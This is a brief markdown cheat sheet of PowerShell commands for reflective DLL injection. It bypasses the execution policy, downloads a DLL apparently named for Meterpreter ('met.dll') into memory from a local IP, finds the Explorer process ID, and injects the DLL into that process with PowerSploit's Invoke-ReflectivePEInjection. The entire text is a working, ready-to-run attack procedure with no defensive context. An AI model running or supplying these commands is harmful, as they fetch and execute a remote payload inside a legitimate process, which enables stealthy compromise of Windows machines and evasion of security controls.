#### Open a powershell window with exec bypass
```powershell
powershell.exe -ep bypass
```

#### Load DLL in a byte array and get Explorer PID
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/met.dll')
$procid = (Get-Process -Name explorer).Id
```

#### Use Invoke-ReflectivePEInjection from PowerSploit

Source: https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/

```powershell
Import-Module Invoke-ReflectivePEInjection.ps1
```

#### Supply byte array and process ID to Invoke-ReflectivePEInjection
```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```